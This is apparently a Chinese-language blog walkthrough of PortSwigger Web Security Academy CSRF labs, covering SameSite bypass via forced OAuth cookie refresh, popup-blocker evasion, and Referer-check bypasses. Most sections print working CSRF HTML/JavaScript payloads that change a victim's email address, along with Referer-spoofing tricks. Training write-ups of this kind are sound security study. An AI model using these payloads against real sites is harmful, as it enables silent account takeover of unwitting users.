在浏览器中，转到利用漏洞攻击服务器。
使用以下模板创建更改受害者电子邮件地址的基本CSRF攻击：
<pre><code>&lt;script&gt;
    history.pushState('', '', '/')
&lt;/script&gt;
&lt;form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST"&gt;
    &lt;input type="hidden" name="email" value="foo@bar.com" /&gt;
    &lt;input type="submit" value="Submit request" /&gt;
&lt;/form&gt;
&lt;script&gt;
    document.forms[0].submit();
&lt;/script&gt;

我的是：
&lt;script&gt;
    history.pushState('', '', '/')
&lt;/script&gt;
&lt;form action="https://0a3f00c7035245fbc295ac0c00560021.web-security-academy.net/my-account/change-email" method="POST"&gt;
    &lt;input type="hidden" name="email" value="foo@bar.com" /&gt;
    &lt;input type="submit" value="Submit request" /&gt;
&lt;/form&gt;
&lt;script&gt;
    document.forms[0].submit();
&lt;/script&gt;</code></pre>



存储（store）并查看漏洞<br/>  
<pre><code>接下来会发生什么取决于自登录以来所经过的时间：
    1、如果超过两分钟，将通过OAuth流登录，攻击将失败。在这种情况下，请立即重复此步骤。
    2、如果在不到两分钟前登录，则攻击成功，电子邮件地址已更改。</code></pre>

 攻击成功<img alt="" height="931" src="https://img-blog.csdnimg.cn/a2484e06bf9b452c9fd63f179d339551.png" width="1200"/>

HTTP历史记录选项卡，找到POST /my-account/change-email请求，并确认会话cookie是否包含在内，即使这是一个跨站点POST请求
（cookie被携带）



<hr/>
part3:
绕过SameSite限制
如果访问/social-login，将自动启动完整的OAuth流。如果仍然与OAuth服务器有一个登录会话，那么这一切都不会发生任何交互。
从代理历史记录中可以看到，每次完成OAuth流时，目标站点都会设置一个新的会话cookie，即使已经登录（因为每次请求完他会set-cookie）



返回到漏洞利用服务器，更改JavaScript，使攻击者首先通过强制浏览器访问/social-login来刷新受害者的会话，然后在短暂停顿后提交电子邮件更改请求。以下是一种可能的方法：
<pre><code>&lt;form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"&gt;
    &lt;input type="hidden" name="email" value="pwned@web-security-academy.net"&gt;
&lt;/form&gt;
&lt;script&gt;
    window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
    setTimeout(changeEmail, 5000);

    function changeEmail(){
        document.forms[0].submit();
    }
&lt;/script&gt;

我的是：
&lt;form method="POST" action="https://0a3f00c7035245fbc295ac0c00560021.web-security-academy.net/my-account/change-email"&gt;
    &lt;input type="hidden" name="email" value="pwned@web-security-academy.net"&gt;
&lt;/form&gt;
&lt;script&gt;
    window.open('https://0a3f00c7035245fbc295ac0c00560021.web-security-academy.net/social-login');
    setTimeout(changeEmail, 5000);

    function changeEmail(){
        document.forms[0].submit();
    }
&lt;/script&gt;</code></pre>

 在新窗口中打开/social-login，以避免在发送更改电子邮件请求之前导航离开该漏洞
存储（store）并查看漏洞（view）。观察到初始请求被浏览器的弹出窗口阻止程序阻止




观察暂停后，CSRF攻击仍在启动。但只有在设置Cookie后不到两分钟的时间内，此操作才能成功。否则攻击将失败，因为弹出窗口阻止程序会阻止强制cookie刷新




<hr/>
part4:
绕过弹出窗口阻止程序
意识到弹出窗口被阻止是因为没有手动与页面交互。
调整利用漏洞攻击，使其诱使受害者单击页面，并仅在用户单击后打开弹出窗口。以下是一种可能的方法：
<pre><code>&lt;form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"&gt;
    &lt;input type="hidden" name="email" value="pwned@portswigger.net"&gt;
&lt;/form&gt;
&lt;p&gt;Click anywhere on the page&lt;/p&gt;
&lt;script&gt;
    window.onclick = () =&gt; {
        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
&lt;/script&gt;

</code></pre>


1、出现提示时，单击页面。这将触发OAuth流并发出一个新的会话cookie。5秒后，注意CSRF攻击被发送，POST /my-account/change-email请求包含新会话cookie。
（转到帐户页面并确认电子邮件地址已更改）
————
2、返回利用漏洞攻击服务器并将利用漏洞攻击发送给受害者
短暂的停顿后，完成实验


---


---


## 四、绕过基于引用的CSRF防御

> 
<h3>1、简述：</h3>
除了使用CSRF令牌的防御之外，一些应用程序还利用HTTP  Referer报头来尝试防御CSRF攻击，通常是通过验证请求是否来自应用程序自己的域。这种方法通常效果不佳，而且常常被绕过。


> 
<h3>2、引用方的验证取决于是否存在标头</h3>
1、某些应用程序验证Referer标头（当它出现在请求中时），但如果标头被省略，则跳过验证。
在这种情况下，攻击者可以创建其 CSRF漏洞利用 导致受害用户的浏览器删除Referer标题在结果请求中。
<pre><code>有多种方法可以实现这一点，但最简单的方法是在承载 CSRF攻击：
&lt;meta name="referrer" content="never"&gt;</code></pre>
<hr/>
2、涉及实验：<br/> 实验11：CSRF，其中Referer验证取决于是否存在标头


> 
<h3>实验11：CSRF，其中Referer验证取决于是否存在标头</h3>
信息：
1、本实验的电子邮件更改功能易受CSRF攻击。它试图阻止跨域请求，但有一个不安全的后备。
2、解决实验：使用漏洞攻击服务器托管一个HTML页面，该页面使用CSRF攻击来更改查看者的电子邮件地址
3、已有账号：wiener:peter
<hr/>
part1:
登录帐户。提交"更新电子邮件"表单
<img alt="" height="934" src="https://img-blog.csdnimg.cn/325d8b6f7cf54ea69c083091f0425dd3.png" width="1200"/><br/> 并在代理历史记录中查找生成的请求,将请求发送到Burp Repeater

并观察如果更改Referer HTTP头中的域，则请求将被拒绝<br/> 完全删除Referer标头，并观察请求现在已被接受

<hr/>
 part2:
创建并托管概念利用验证，包含以下HTML以隐藏"引用者"标题：
<pre>`&lt;meta name="referrer" content="no-referrer"&gt;`</pre>
生成poc，并加上上述的referrer设置

完整的为
<pre><code>&lt;meta name="referrer" content="no-referrer"&gt;
&lt;html&gt;
  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
  &lt;body&gt;
  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;
    &lt;form action="https://0ade00340423eac1c0e745e900c40005.web-security-academy.net/my-account/change-email" method="POST"&gt;
      &lt;input type="hidden" name="Cookie&amp;#58;&amp;#32;session" value="vnfo6JaZrfEqBxULoEnwjJiA9YGwtd2g" /&gt;
      &lt;input type="hidden" name="Upgrade&amp;#45;Insecure&amp;#45;Requests&amp;#58;&amp;#32;1" value="" /&gt;
      &lt;input type="hidden" name="Sec&amp;#45;Fetch&amp;#45;Dest&amp;#58;&amp;#32;document" value="" /&gt;
      &lt;input type="hidden" name="Sec&amp;#45;Fetch&amp;#45;Mode&amp;#58;&amp;#32;navigate" value="" /&gt;
      &lt;input type="hidden" name="Sec&amp;#45;Fetch&amp;#45;Site&amp;#58;&amp;#32;same&amp;#45;origin" value="" /&gt;
      &lt;input type="hidden" name="Sec&amp;#45;Fetch&amp;#45;User&amp;#58;&amp;#32;&amp;#63;1" value="" /&gt;
      &lt;input type="hidden" name="email" value="111111&amp;#64;qq&amp;#46;com" /&gt;
      &lt;input type="submit" value="Submit request" /&gt;
    &lt;/form&gt;
    &lt;script&gt;
      document.forms[0].submit();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
存储(store)漏洞，然后单击"Deliver to victim"（发送给受害者）

 完成实验




---


> 
<h3>3、可以绕过引用方的验证</h3>
1、某些应用程序验证Referer报头以一种可以被绕过的简单方式。
<pre><code>1、如应用程序验证Referer以预期值开始，则攻击者可以将其作为自己域的子域：
http://vulnerable-website.com.attacker-website.com/csrf-attack

2、如果应用程序只是验证Referer包含其自己的域名，则攻击者可以将所需的值放在URL中的其他位置：
http://attacker-website.com/csrf-attack?vulnerable-website.com</code></pre>

<hr/>
2、尽管可以使用Burp来识别这种行为，但是当在浏览器中测试概念证明时，经常会发现这种方法不再起作用。为了降低敏感数据以这种方式泄漏的风险，许多浏览器现在将查询字符串从Referer标头
<hr/>
3、可以通过确保包含利用漏洞攻击的响应具有Referrer-Policy: unsafe-ur标题集。这样可以确保发送完整的URL，包括查询字符串。
<hr/>
4、涉及实验：<br/> 实验12：引用方验证中断的CSRF


---


<br/>  

> 
<h3>实验12：引用方验证中断的CSRF</h3>
信息：
本实验的电子邮件更改功能易受CSRF攻击。它尝试检测和阻止跨域请求，但可以绕过检测机制。
解决实验：使用漏洞攻击服务器托管一个HTML页面，该页面使用CSRF攻击来更改查看者的电子邮件地址。
已有账号：wiener:peter
<hr/>
part1：
登录帐户。提交"更新电子邮件"表单，并在代理历史记录中查找生成的请求

<img alt="" height="936" src="https://img-blog.csdnimg.cn/de0e0a7b1e574662a1619bf1013fd985.png" width="1200"/><br/> 发送请求到BP repeater。如果更改Referer HTTP头中的域，则请求将被拒绝
 复制实验实例的原始域，并将其以查询字符串的形式附加到Referer头中
<pre><code>Referer: https://arbitrary-incorrect-domain.net?YOUR-LAB-ID.web-security-academy.net

我的是：
Referer: https://arbitrary-incorrect-domain.net?0ae8003d0469e3dac50a8b0a009e0035.web-security-academy.net</code></pre>
<br/> 发送请求并观察请求现在是否已被接受。该网站似乎接受任何引用头，只要它包含预期的域某处的字符串<img alt="" height="936" src="https://img-blog.csdnimg.cn/6bbcc8b1c9d64934928c39185e5e20c5.png" width="1200"/>

<hr/>
part2：
按照无防御CSRF漏洞解决方案实验室中的说明创建CSRF概念攻击验证


<pre><code>&lt;html&gt;
  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
  &lt;body&gt;
  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;
    &lt;form action="https://0ae8003d0469e3dac50a8b0a009e0035.web-security-academy.net/my-account/change-email" method="POST"&gt;
      &lt;input type="hidden" name="email" value="111111&amp;#64;qq&amp;#46;com" /&gt;
      &lt;input type="submit" value="Submit request" /&gt;
    &lt;/form&gt;
    &lt;script&gt;
      document.forms[0].submit();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
并将其托管在攻击服务器上。编辑JavaScript，使history.pushState()函数的第三个参数包含一个查询字符串，其中包含实验室实例URL，如下所示：
<pre><code>history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")

我的是：
history.pushState("", "", "/?https://0ae8003d0469e3dac50a8b0a009e0035.web-security-academy.net")</code></pre>
<br/> 这将导致生成的请求中的Referer标头在查询字符串中包含目标站点的URL，就像前面测试的那样
<pre><code>CSRF完整poc：
&lt;html&gt;
  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
  &lt;body&gt;
  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;
    &lt;form action="https://0ae8003d0469e3dac50a8b0a009e0035.web-security-academy.net/my-account/change-email" method="POST"&gt;
      &lt;input type="hidden" name="email" value="111111&amp;#64;qq&amp;#46;com" /&gt;
      &lt;input type="submit" value="Submit request" /&gt;
    &lt;/form&gt;
    &lt;script&gt;
      history.pushState("", "", "/?https://0ae8003d0469e3dac50a8b0a009e0035.web-security-academy.net")
      document.forms[0].submit();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>

如果存储该利用漏洞攻击并通过单击"查看利用漏洞攻击"进行测试，则可能会再次遇到"invalid Referer header"错误。这是因为作为一种安全措施，许多浏览器现在默认从Referer头中剥离查询字符串。要覆盖此行为并确保请求中包含完整的URL，请返回利用漏洞攻击服务器并将以下标题添
<pre><code>加到"Head"部分：
Referrer-Policy: unsafe-url
（注意，与普通的Referer头不同）</code></pre>

<hr/>
part3：
完成实验
存储（store）漏洞，然后单击"Deliver to victim"（发送给受害者）

 完成实验




---

